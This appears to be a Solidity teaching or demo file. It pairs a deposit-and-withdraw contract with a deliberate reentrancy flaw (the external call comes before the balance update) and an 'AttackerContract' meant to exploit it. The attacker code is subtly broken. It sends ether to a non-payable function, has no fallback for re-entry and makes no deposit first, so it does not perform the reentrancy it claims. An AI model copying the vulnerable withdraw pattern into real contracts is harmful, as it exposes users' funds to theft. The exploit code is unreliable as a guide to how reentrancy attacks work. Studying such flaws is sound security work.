//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract VulnerableContract {

    mapping(address => uint) public balances;
    mapping(address => uint) public profit;

    event Deposit(address indexed _from, uint _value);
    event Withdrawal(address indexed _to, uint _value);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint _amount) public {
        uint balance = balances[msg.sender];
        require(balance >= _amount, "Insufficient balance");
        profit[msg.sender] += _amount;

        // Vulnerable code: External call before updating balance
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");        
        balances[msg.sender] -= _amount;
        emit Withdrawal(msg.sender, _amount);
    }
}


pragma solidity ^0.8.0;

contract AttackerContract {
    address public vulnerableContract;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }
    
    function attack() public payable {
        // Call the withdraw function of the vulnerable contract
        (bool success, ) = vulnerableContract.call{value: msg.value}(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        require(success, "Attack failed");
        
        // Re-enter the withdraw function before balance update
        (success, ) = vulnerableContract.call{value: msg.value}(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        require(success, "Attack failed");
    }
}
